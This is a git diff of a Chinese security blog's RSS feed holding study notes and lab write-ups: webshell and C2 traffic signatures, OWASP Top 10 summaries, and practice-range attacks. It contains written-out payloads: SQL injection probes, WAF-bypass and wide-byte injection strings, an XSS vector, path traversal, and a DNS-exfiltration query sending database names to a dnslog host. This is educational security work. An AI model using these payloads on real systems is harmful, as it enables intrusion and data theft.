+&lt;p&gt;哥斯拉的响应体的结构是 md5 前 16 位 + base64 + md5 后 16 位。&lt;/p&gt;
+&lt;p&gt;哥斯拉默认的 user-agent 会暴露 jdk 信息，但是哥斯拉支持自定义请求头，所以攻击者可以去除这个特征。&lt;/p&gt;
+&lt;p&gt;哥斯拉的 Accept字段默认是 Accept:text/html,image/gif,image/jpeg,*;q=.2,/;q=.2，但是同上，攻击者可以修改请求头信息，所以只作为一个辅助监测手段。&lt;/p&gt;
+&lt;p&gt;哥斯拉会发三个特定请求。&lt;/p&gt;
+&lt;h4 id=&#34;蚁剑-antsword&#34;&gt;蚁剑 antsword&lt;/h4&gt;
+&lt;p&gt;蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。&lt;/p&gt;
+&lt;p&gt;蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。&lt;/p&gt;
+&lt;p&gt;蚁剑的响应体为 base64 编码，随机数 + 结果 + 随机数。&lt;/p&gt;
+&lt;p&gt;蚁剑的 php webshell 使用 eval 和 assert 函数；asp webshell 使用 assert 函数；jsp webshell 使用 java 类加载。&lt;/p&gt;
+&lt;p&gt;蚁剑加密数据包的参数很多以 _0x&amp;hellip; 的形式出现（下划线可替换为其他字符）。&lt;/p&gt;
+&lt;h3 id=&#34;红队工具流量特征&#34;&gt;红队工具流量特征&lt;/h3&gt;
+&lt;h4 id=&#34;cobaltstrike&#34;&gt;CobaltStrike&lt;/h4&gt;
+&lt;p&gt;木马相关。&lt;/p&gt;
+&lt;p&gt;默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。&lt;/p&gt;
+&lt;p&gt;木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。&lt;/p&gt;
+&lt;p&gt;下发任务的方法是 c2 服务器在心跳包的响应里发送任务。&lt;/p&gt;
+&lt;p&gt;beacon 使用 post 回传数据并且 url 为 /submit.php?id=&lt;/p&gt;
+&lt;p&gt;stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。&lt;/p&gt;
+&lt;p&gt;stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。&lt;/p&gt;
+&lt;h4 id=&#34;metasploit&#34;&gt;metasploit&lt;/h4&gt;
+&lt;p&gt;木马相关。&lt;/p&gt;
+&lt;p&gt;响应包有 MZ 标头和 cannot be run in DOS mode 字样。&lt;/p&gt;
+&lt;p&gt;心跳包、固定 ua 头。&lt;/p&gt;
+&lt;h4 id=&#34;nmapfscan&#34;&gt;nmap&amp;amp;fscan&lt;/h4&gt;
+&lt;p&gt;扫描相关。&lt;/p&gt;
+&lt;p&gt;共同特征。开 wireshark，请求包看到 window:1024 和 options(4 bytes): tcp option。&lt;/p&gt;
+&lt;h4 id=&#34;frp&#34;&gt;frp&lt;/h4&gt;
+&lt;p&gt;隧道相关。&lt;/p&gt;
+&lt;p&gt;连接成功会看到 run_id。&lt;/p&gt;
+&lt;h4 id=&#34;nps&#34;&gt;nps&lt;/h4&gt;
+&lt;p&gt;隧道相关。&lt;/p&gt;
+&lt;p&gt;第一个请求包末尾有版本号，例如 0.26.1.0。&lt;/p&gt;
+&lt;p&gt;第二个请求包有 32 为双向认证。&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/char/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>OWASP Top 10 选讲</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/top10/</link>
+        <pubDate>Mon, 15 Apr 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/top10/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/top10/ -&lt;p&gt;这里对 OWASP 在 2013、2017、2021 年提出的十大常规漏洞的原理和防御进行选择性的总结。OWASP 是一个致力于网络安全的国际非盈利组织，OWASP Top 10 是定期更新的报告，概述了 Web 应用程序安全性的安全问题，重点关注 10 个最关键的风险。&lt;/p&gt;
+&lt;h3 id=&#34;ssrf&#34;&gt;ssrf&lt;/h3&gt;
+&lt;h4 id=&#34;防御-ssrf&#34;&gt;防御 ssrf&lt;/h4&gt;
+&lt;p&gt;（1）设置 url 白名单，限制内网 ip 的访问；&lt;/p&gt;
+&lt;p&gt;（2）禁用非常规协议和端口，例如禁用除 http/s 之外的协议、禁用除 80/443 之外的端口；&lt;/p&gt;
+&lt;p&gt;（3）统一报错信息，避免根据报错信息的不同判断内网 ip 端口的开放状态。&lt;/p&gt;
+&lt;h4 id=&#34;利用-ssrf&#34;&gt;利用 ssrf&lt;/h4&gt;
+&lt;p&gt;（1）dict 协议泄露了软件版本；&lt;/p&gt;
+&lt;p&gt;（2）file 协议读取敏感文件；&lt;/p&gt;
+&lt;p&gt;（3）gopher 协议反弹 shell；&lt;/p&gt;
+&lt;p&gt;（4）http/s 协议扫描内网端口。&lt;/p&gt;
+&lt;h4 id=&#34;ssrf-出现的场景&#34;&gt;ssrf 出现的场景&lt;/h4&gt;
+&lt;p&gt;凡是用户输入的 url 和服务器进行交互的地方都可能存在 ssrf。例如：（1）用 url 分享网页信息；（2）在线翻译/转码；（3）图片加载/下载；（4）图片/文章的收藏；（5）未授权访问的页面里面有 ssrf；（6）url 锚点包含 ssrf。&lt;/p&gt;
+&lt;h4 id=&#34;ssrf-绕过限制&#34;&gt;ssrf 绕过限制&lt;/h4&gt;
+&lt;p&gt;ip rebind&lt;/p&gt;
+&lt;h3 id=&#34;sql-注入&#34;&gt;sql 注入&lt;/h3&gt;
+&lt;h4 id=&#34;sql-注入如何判断数据库类型&#34;&gt;sql 注入如何判断数据库类型&lt;/h4&gt;
+&lt;p&gt;(1) 从语言习惯判断。&lt;/p&gt;
+&lt;p&gt;asp：SQL Server，Access&lt;/p&gt;
+&lt;p&gt;.net ：SQL Server&lt;/p&gt;
+&lt;p&gt;php：Mysql，PostgreSql&lt;/p&gt;
+&lt;p&gt;java：Oracle，Mysql&lt;/p&gt;
+&lt;p&gt;（2）从默认端口判断。&lt;/p&gt;
+&lt;p&gt;Mysql: 3306&lt;/p&gt;
+&lt;p&gt;Oracle :1521&lt;/p&gt;
+&lt;p&gt;SQL Server :1433&lt;/p&gt;
+&lt;p&gt;PostgreSQL :5432&lt;/p&gt;
+&lt;p&gt;Access : 文件型数据库没有默认端口&lt;/p&gt;
+&lt;p&gt;（3）从页面报错判断。&lt;/p&gt;
+&lt;p&gt;Oracle: ORA-00933:SQLcommand not properly ended&lt;/p&gt;
+&lt;p&gt;SQL Server: Msg 170,level 15, State 1,Line 1&lt;/p&gt;
+&lt;p&gt;Mysql: you have an error in your SQL syntax&lt;/p&gt;
+&lt;p&gt;（4）从特有表判断&lt;/p&gt;
+&lt;p&gt;几个数据库都可以使用 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/test.php?id=1 and (select count(*) from 特有表)&amp;gt;0 and 1=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Oracle: sys.usr_tables&lt;/p&gt;
+&lt;p&gt;Mysql: information_schema.tables&lt;/p&gt;
+&lt;p&gt;SQL Server: sysobjects&lt;/p&gt;
+&lt;p&gt;Access: msyobjects&lt;/p&gt;
+&lt;p&gt;确认注入点之后把特有表带进去看看哪个不报错就是哪个。&lt;/p&gt;
+&lt;h4 id=&#34;mysql-注入的常用函数有哪些&#34;&gt;mysql 注入的常用函数有哪些&lt;/h4&gt;
+&lt;p&gt;查询字段用 order by，联合查询用 union select&lt;/p&gt;
+&lt;p&gt;延时盲注用 sleep&lt;/p&gt;
+&lt;p&gt;报错注入一般用 updatexml 和 extractvalue，用 floor 也可以&lt;/p&gt;
+&lt;h4 id=&#34;宽字节注入的原理和条件是什么&#34;&gt;宽字节注入的原理和条件是什么&lt;/h4&gt;
+&lt;p&gt;如果网站在用户输入的引号前面加了反斜杠进行转义，而网站使用 gbk 编码，则 sql 注入点符合宽字节注入的条件。&lt;/p&gt;
+&lt;p&gt;payload: %df’+or+1=1#&lt;/p&gt;
+&lt;p&gt;%df&amp;rsquo; 被十六进制编码变为 %df%5c%27，而 df5c 被 gbk 编码变为汉字“运”，从而单引号 %27 被解析。&lt;/p&gt;
+&lt;h4 id=&#34;mysql-写-shell-的方法&#34;&gt;mysql 写 shell 的方法&lt;/h4&gt;
+&lt;p&gt;（1）导出函数写 shell。一句话导出或者创建表导出，可以用函数 outfile 和 dumpfile。&lt;/p&gt;
+&lt;p&gt;（2）日志文件写 shell。把日志设置成木马文件，将 shell 写进日志。&lt;/p&gt;
+&lt;h4 id=&#34;mysql-无法写-shell-的原因&#34;&gt;mysql 无法写 shell 的原因&lt;/h4&gt;
+&lt;p&gt;（1）打开 mysql 配置文件 My.ini 设置 secure_file_priv=null 可以禁止导入导出。与之相对，如果设置为 / 或者置空则无限制，如果设置为某个目录则在该目录下可以导入导出。从防守方的角度来看设置为 null 安全，可以用命令 show global variables like &amp;lsquo;%secure%&amp;rsquo; 快速检查配置。&lt;/p&gt;
+&lt;p&gt;（2）绝对路径不正确则无法写 shell。从防守方的角度来看不泄露绝对路径可以防止 mysql 写 shell。&lt;/p&gt;
+&lt;p&gt;（3）权限不足导致无法写 shell。没有 file 读写权限或者无权限开启日志记录。&lt;/p&gt;
+&lt;p&gt;（4）在 PHP 设置中禁用魔术引号，即开启 GPC，对引号进行转义，则无法写 shell。&lt;/p&gt;
+&lt;p&gt;（5）站库分离导致无法连接 mysql，则无法写 shell。&lt;/p&gt;
+&lt;h4 id=&#34;如何利用-dns-外带-sql-注入结果&#34;&gt;如何利用 dns 外带 sql 注入结果&lt;/h4&gt;
+&lt;p&gt;load_file 函数的作用是读取远程文件，可以解析 url。攻击者可以将 sql 注入的结果拼接到域名，在 dnslog 平台看到结果。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select load_file(concat(&#39;file:\\\\&#39;,(select database()),&#39;.qx7x7i.dnslog.cn&#39;));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;条件：secure_file_priv 选项必须为空，不能为null；对方的主机必须开放 445 端口。&lt;/p&gt;
+&lt;h4 id=&#34;sqlmap-扫描-https-网站无法访问怎么办&#34;&gt;sqlmap 扫描 https 网站无法访问怎么办&lt;/h4&gt;
+&lt;p&gt;（1）添加 &amp;ndash;force-ssl 参数；（2）走本地代理端口。&lt;/p&gt;
+&lt;h4 id=&#34;mysql-通常采取哪种加密方式&#34;&gt;mysql 通常采取哪种加密方式&lt;/h4&gt;
+&lt;p&gt;sha1，md5&lt;/p&gt;
+&lt;h4 id=&#34;防御-sql-注入&#34;&gt;防御 sql 注入&lt;/h4&gt;
+&lt;p&gt;（1）后端代码层面：&lt;/p&gt;
+&lt;p&gt;正则过滤：不传输 payload&lt;/p&gt;
+&lt;p&gt;预编译：不解析 payload&lt;/p&gt;
+&lt;p&gt;转义：改写 payload 令其失效&lt;/p&gt;
+&lt;p&gt;权限控制：就算解析 payload 语句攻击者也没有读写权限，攻击者得不到任何信息和权限。&lt;/p&gt;
+&lt;p&gt;（2）网络传输层面：配置 waf 进行拦截，不把带有 payload 的语句传输到后端。&lt;/p&gt;
+&lt;h3 id=&#34;xss&#34;&gt;xss&lt;/h3&gt;
+&lt;h4 id=&#34;xss-的原理&#34;&gt;xss 的原理&lt;/h4&gt;
+&lt;p&gt;用户输入的 js 代码被浏览器解析了，那么 js 能做的就是 xss 能做的。&lt;/p&gt;
+&lt;h4 id=&#34;xss-的危害&#34;&gt;xss 的危害&lt;/h4&gt;
+&lt;p&gt;（1）盗取 cookie；（2）获取受害者 ip；（3）屏幕截图；（4）记录键盘输入；（5）前端 js 挖矿；（6）xss 蠕虫；（7）水坑攻击；（8）dos 攻击。&lt;/p&gt;
+&lt;h4 id=&#34;xss-绕-waf&#34;&gt;xss 绕 waf&lt;/h4&gt;
+&lt;p&gt;常用绕过方法：双写大小写、编码、找没被禁用的标签、没被禁用的事件、不常见的语句&lt;/p&gt;
+&lt;h4 id=&#34;防御-xss&#34;&gt;防御 xss&lt;/h4&gt;
+&lt;p&gt;过滤、实体编码、cookie 设置 http only、限制输入长度&lt;/p&gt;
+&lt;h3 id=&#34;csrf&#34;&gt;csrf&lt;/h3&gt;
+&lt;h4 id=&#34;csrf-的条件&#34;&gt;csrf 的条件&lt;/h4&gt;
+&lt;p&gt;用户浏览器里面保存着有效的 cookie，并且使用同一个浏览器访问钓鱼链接。&lt;/p&gt;
+&lt;h4 id=&#34;csrf-的防御&#34;&gt;csrf 的防御&lt;/h4&gt;
+&lt;p&gt;（1）使用正确的 cors 配置，验证 origin 和 referer；&lt;/p&gt;
+&lt;p&gt;（2）设置 csrf token，用户点击钓鱼链接不会携带 csrf token 就无法通过身份认证。&lt;/p&gt;
+&lt;h3 id=&#34;xxe-注入&#34;&gt;xxe 注入&lt;/h3&gt;
+&lt;h4 id=&#34;xxe-的危害&#34;&gt;xxe 的危害&lt;/h4&gt;
+&lt;p&gt;因为后端解析了 xml 外部实体，并且支持 file 和 ftp 等协议，导致 xxe 注入可以造成访问内网、任意文件读取和下载、dos 攻击等危害。&lt;/p&gt;
+&lt;h4 id=&#34;xxe-的防御&#34;&gt;xxe 的防御&lt;/h4&gt;
+&lt;p&gt;XML 解析库在调用时严格禁止对外部实体的解析。&lt;/p&gt;
+&lt;h3 id=&#34;文件包含漏洞&#34;&gt;文件包含漏洞&lt;/h3&gt;
+&lt;h4 id=&#34;文件包含的原理&#34;&gt;文件包含的原理&lt;/h4&gt;
+&lt;p&gt;文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。&lt;/p&gt;
+&lt;h4 id=&#34;文件包含的利用&#34;&gt;文件包含的利用&lt;/h4&gt;
+&lt;p&gt;（1）加载图片马；（2）包含被污染的日志进行 getshell；（3）file 协议造成任意文件读取&lt;/p&gt;
+&lt;h3 id=&#34;java-反序列化&#34;&gt;java 反序列化&lt;/h3&gt;
+&lt;h4 id=&#34;java-反序列化漏洞概述&#34;&gt;java 反序列化漏洞概述&lt;/h4&gt;
+&lt;p&gt;字节流变为 java 对象称为反序列化，反之称为序列化。由于 java 反序列化方法的不慎调用，用户在 http 报文输入的字节流能够被后端当作 java 对象解析。因此攻击者可以利用这个漏洞构造恶意语句交给后端执行。主要危害是 rce 和 dos，现实中一般需要多个漏洞配合利用才能造成实际危害，称为反序列化利用链。&lt;/p&gt;
+&lt;h4 id=&#34;jndi-注入&#34;&gt;jndi 注入&lt;/h4&gt;
+&lt;p&gt;jndi 是 java 接口，可以访问命名和目录服务。jndi 的 lookup 方法的 uri 参数可控，攻击者注入一个恶意 url，存储一个 java payload，这个 url 被加载时 payload 被解析，造成了注入攻击。&lt;/p&gt;
+&lt;h4 id=&#34;rmi&#34;&gt;rmi&lt;/h4&gt;
+&lt;p&gt;rmi 即远程方法调用，分为三个部分：客户端进行方法的调用，服务端提供方法、对代码进行解析，注册中心相当于一个字典，客户端调用服务端的方法时在注册中心进行查询和引用。&lt;/p&gt;
+&lt;h4 id=&#34;java-反序列化利用工具&#34;&gt;java 反序列化利用工具&lt;/h4&gt;
+&lt;p&gt;ysoserial 集成了很多利用链，只需要查看网站的第三方组件，然后在 ysoserial 里面找对应的利用链。&lt;/p&gt;
+&lt;h4 id=&#34;java-反序列化的常见利用链&#34;&gt;java 反序列化的常见利用链&lt;/h4&gt;
+&lt;h4 id=&#34;shiro550-和-shiro721-有什么区别&#34;&gt;shiro550 和 shiro721 有什么区别&lt;/h4&gt;
+&lt;p&gt;shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。&lt;/p&gt;
+&lt;p&gt;shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。&lt;/p&gt;
+&lt;p&gt;shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。&lt;/p&gt;
+&lt;h4 id=&#34;fastjson-rce-流程&#34;&gt;fastjson rce 流程&lt;/h4&gt;
+&lt;p&gt;fastjson 将 java 对象序列化为 json 字节流，将 json 字节流反序列化为 java 对象。fastjson 使用 rmi 或者 ldap 协议（远程方法调用、情形目录访问）。&lt;/p&gt;
+&lt;p&gt;简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。&lt;/p&gt;
+&lt;h4 id=&#34;如何判断-log4j2-是否利用成功&#34;&gt;如何判断 log4j2 是否利用成功&lt;/h4&gt;
+&lt;p&gt;log4j2 是日志组件，其 lookups 机制存在 jndi 注入。&lt;/p&gt;
+&lt;p&gt;（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；&lt;/p&gt;
+&lt;p&gt;（2）查看目标主机是否存在 dnslog 活动；&lt;/p&gt;
+&lt;p&gt;（3）查看是否下载恶意类。&lt;/p&gt;
+&lt;h4 id=&#34;struts2-反序列化原理&#34;&gt;struts2 反序列化原理&lt;/h4&gt;
+&lt;p&gt;Struts2 对标签属性执行 ognl（对象图形导航语言）解析，可造成 rce。&lt;/p&gt;
+&lt;h4 id=&#34;weblogic-历史漏洞&#34;&gt;weblogic 历史漏洞&lt;/h4&gt;
+&lt;p&gt;（1）t3 协议引起的反序列化漏洞；（2）Gadget 造成的 rce；（3）任意文件上传；（4）ssrf。&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/top10/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>ssrf 任意文件下载靶场演示</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/ar1/</link>
+        <pubDate>Fri, 15 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/ar1/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/ar1/ -&lt;p&gt;我们用 webug 演示。首先看到一个下载文件的按钮，打开查看器，找到这个按钮，看到路径使用 file 协议，直接访问内网。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/ar/ar0-0.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;对 ../ 的数量进行尝试，找到 file=../../../my.ini，点击下载按钮下载 mysql 配置文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/ar/ar0-1.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/ar1/ - null</description>
         </item>
     
     
@@ -39,7 +472,7 @@
         <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo5/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo5/ -&lt;p&gt;漏洞原理：我们添加一个用来占位的 cookie 保证 cookie 不为空，即可越权访问后台，并且可以避免跳转回登录页面。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo5/ -&lt;p&gt;漏洞原理：我们添加一个用来占位的 cookie 保证 cookie 不为空，即可越权访问后台，并且可以避免跳转回登录页面。&lt;/p&gt;
 &lt;p&gt;这个靶场演示的是熊海 CMS v1.0 的越权漏洞。&lt;/p&gt;
 &lt;p&gt;尝试将 url 中的 ?r=login 改为 ?r=index 直接进后台，发现无效，会跳回登录页面。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-0.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
@@ -56,12 +489,32 @@
     
     
         <item>
+        <title>MetInfo v4.0 越权修改密码</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/lo4/</link>
+        <pubDate>Tue, 12 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/lo4/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo4/ -&lt;p&gt;这个靶场演示的是 MetInfo v4.0 的 nday。&lt;/p&gt;
+&lt;p&gt;先注册一个账号，找到修改密码，然后抓包。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-0.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-1.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 userid 改为任意用户，密码自己设置。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-2.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用其他人的用户名和自己设置的密码，成功登录到其他人的账号。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-3.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入个人中心找到 flag=ywaq{uhgJHzxdIG}。&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/lo4/ - null</description>
+        </item>
+    
+    
+    
+        <item>
         <title>vl CMS 无密码登录</title>
         <link>https://xxxhidexxx.github.io/posts/sec/lo3/</link>
         <pubDate>Mon, 11 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo3/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo3/ -&lt;p&gt;打开靶场页面如下。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo3/ -&lt;p&gt;打开靶场页面如下。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-1.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;利用 nday 已知信息，将 url 修改为 index.php?s=/member/res_login/ 并抓包。&lt;/p&gt;
 &lt;p&gt;将 GET 改为 POST 并在结尾加上 id=1。&lt;/p&gt;
@@ -81,7 +534,7 @@
         <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo2/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo2/ -&lt;p&gt;我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo2/ -&lt;p&gt;我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&lt;/p&gt;
 &lt;p&gt;打开购买商品的页面，尝试修改数量为负，发现有前端拦截。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-4.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-5.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
@@ -101,7 +554,7 @@
         <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo1/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo1/ -&lt;p&gt;打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo1/ -&lt;p&gt;打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-1.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;首先发现这个数量可以直接修改成 -1，但是提交无效。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-4.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
@@ -112,161 +565,6 @@
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-7.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;订单页面看到了 flag=ywaq{zxdijGcztU}。&lt;/p&gt;
 - https://xxxhidexxx.github.io/posts/sec/lo1/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>Yzm CMS 存在反射型 XSS</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/xss1/</link>
-        <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/xss1/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/xss1/ -&lt;p&gt;YzmCMS 主页面的搜索功能有三个参数，这三个参数都存在反射性 xss。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/xss/xss0-0.png&#34; alt=&#34;xss1&#34;&gt;&lt;/p&gt;
-&lt;p&gt;没有过滤，我们插入常规 payload 即可。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;img src=a onerror=alert(1)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/xss/xss0-1.png&#34; alt=&#34;xss1&#34;&gt;&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/xss1/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>SQL 注入绕 WAF</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli9/</link>
-        <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli9/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli9/ -&lt;p&gt;这个靶场演示的是最新版安全狗。&lt;/p&gt;
-&lt;p&gt;我们输入单引号，and，等号之类的字符都会被拦截。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-1.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
-&lt;p&gt;利用内联注释构造如下 payload，即可成功绕过这个拦截。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?id=1/*!50001-- qwe/*%0Aand 1=1*/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;其中 /*!50001 something */ 是 mysql 的内联注释，意思是当版本大于等于 5.00.01 则执行注释内语句。&lt;/p&gt;
-&lt;p&gt;&amp;ndash; qwe 注释了 / * 因为 &amp;ndash; qwe 是单行注释，因此当遇到 %0a 换行时就不会再接着注释了。其中因为 1=1 写在/ * * /里面，WAF认为他是一个注释，所以不会管，但其实我们已经注释了，而这个 / * 结尾的 * / 是闭合开始时的 / * !&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-0.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
-&lt;p&gt;随后提取 flag 即可，此处从略。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?id=1/*!50001-- qwe/*%0Aand 1=2 union select 1,1,schema_name from information_schema.schemata limit 0,1*/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-2.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-3.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli9/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>宽字节注入靶场</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli8/</link>
-        <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli8/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli8/ -&lt;p&gt;起因。网站开发防止 SQL 注入添加了 PHP 函数：addslashes()。php语言中的addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是单引号(&amp;rsquo;)，双引号(&amp;quot;)，反斜线（\）与NUL（NULL字符）。例如客户端提交的参数中如果含有单引号，双引号等这些特殊字符，addslashes 函数则会在单引号前加反斜线“\”，将单引号转义成没有功能性的字符。&lt;/p&gt;
-&lt;p&gt;构造 payload：
-%df&amp;rsquo; or 1=1 &amp;ndash; qwe
-%df&amp;rsquo; or 1=0 &amp;ndash; qwe&lt;/p&gt;
-&lt;p&gt;则 %df&#39; 被十六进制编码变为 %df%5c%27，而 df5c 被 gbk 编码变为汉字“运”，从而单引号 %27 被解析。&lt;/p&gt;
-&lt;p&gt;绕过这个斜杠之后，这个靶场剩下的部分是走流程用 union 读取 flag，此处从略。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli8-0.png&#34; alt=&#34;sqli8&#34;&gt;&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli8/ - null</description>
-        </item>
-    
-    
-    
-        <item>
